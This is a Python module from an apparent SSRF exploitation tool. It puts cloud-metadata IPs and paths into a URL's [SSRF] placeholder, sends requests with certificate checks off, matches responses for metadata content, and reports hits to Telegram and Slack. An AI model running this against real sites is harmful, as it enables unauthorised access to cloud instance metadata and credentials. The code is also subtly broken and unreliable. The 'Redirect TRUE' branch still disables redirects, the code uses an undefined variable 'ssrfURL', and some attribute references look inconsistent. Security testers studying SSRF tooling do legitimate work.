#!/usr/bin/python3

from Sprko.ui import arguments, console
from requests import get as sendGetRequest
from json import load as loadJSON
from modules.sender import contact
from modules import readData , sender
from datetime import date


msg 			  = console.msg
status_code_color = console.status_code
length 			  = console.length
arg 			  = arguments.arg
day_today 		  = date.today()

telegram_config   = readData.sender('telegram')
slack_config   	  = readData.sender('slack')

telegram_bot 	  = telegram_config['bot_api']
telegram_chat	  = telegram_config['chat_id']
slack_secret 	  = slack_config['secret']


# take cloud name , read config/metadata.json , return data
def cloudData(cloud):
	openJsonFile = open('config/metadata.json')
	data 		 = loadJSON(openJsonFile)[cloud]
	return data

cloudx = cloudData("aws")


# check the cloud => [config/metadata.json/%aws%] have this part or no , return True or None
def checkPart(partEnterie, cloud):
	for part in cloudData(cloud).keys():
		if part == partEnterie:
			return True

# [take url , cloudName] and then run cloudData(cloudName) to get config data for this cloud from config/metadata.json ,send 2 request [one allow redirect , else deny redirecy] , request sended by this file , take path and send request and match from same file :) if match True will alert this metadata file
def cloudCheck(url, cloud):
	cloud_data = cloudData(cloud)

	global auth_config_header
	
	if checkPart("header", cloud) == True:
		auth_config_header = cloud_data['header']
	else:
		auth_config_header = None


	for protocol in cloud_data['protocol']:
		for ip in cloud_data['internal']:
			for path,match in cloud_data['metadata'].items():
				payload = protocol+"://"+ip+"/"+path
				# will replace [SSRF] from url and try in this location , [this exploit run after you run discover where ssrf! in file core/main => ssrf().discover(url) if found ssrf replace param value to [SSRF]
				full_url = url.replace("[SSRF]", payload)

				
				try:
					### NOTIC : i am send 2 request one redirct true and another redirect false 
					
					# Redirect FALSE
					response = sendGetRequest(full_url, timeout=10, verify=False, allow_redirects=False, headers=auth_config_header)
					if arg.logs: print(msg.log(response.url+" "+status_code_color(response.status_code)) + length(response.content))
					if str(match) in response.text: 
						print(msg.critical("[Metadata](access file) "+str(full_url)))
						
						# save results if -o, --output
						if arg.output:
							of = open(arg.output,"a+")
							wf = of.writelines(("[CRITICAL][Metadata](access file) "+str(url+payload)+"\n"))
							cf = of.close()

						# report [slack|telegram] if -r, --report
						if arg.report:
							contact.telegram(sender.telegram_bot_api, sender.telegram_chat_id, str(day_today)+"\n[CRITICAL](SSRF Access metadata file): {}".format(url+payload))
						return True # to break from try
					
					# Redirect TRUE
					response = sendGetRequest(full_url, timeout=10, verify=False, allow_redirects=False, headers=auth_config_header)
					if arg.logs: print(msg.log(response.url+" "+status_code_color(response.status_code)) + length(response.content))
					if str(match) in response.text: 
						print(msg.critical("[Metadata](access file) "+str(full_url)))
						
						# save results if -o, --output
						if arg.output:
							of = open(arg.output,"a+")
							wf = of.writelines(("[CRITICAL][SSRF][Metadata](access file) "+str(url+payload)+"\n"))
							cf = of.close()

						# report [slack|telegram] if -rb, --report
						# report [slack|telegram] if -rb, --report
						if arg.report:
							sender.contact.telegram(sender.telegram_bot_api, sender.telegram_chat_id, str(day_today)+"\n[CRITICAL](SSRF Access metadata file): {}".format(url+payload))
							sender.contact.slack(sender.slack_secret, str(day_today)+"\n[MEDIUM](Pottential SSRF): {}".format(ssrfURL))

						return True # to break from try
						
				except Exception as e:
					# print("error responseVerify.py: [1] \t", e)
					of = open("log/errors.log", "a+")
					wf = of.writelines("error responseVerify.py: "+url+": "+str(e)+"\n")
					cf = of.close()


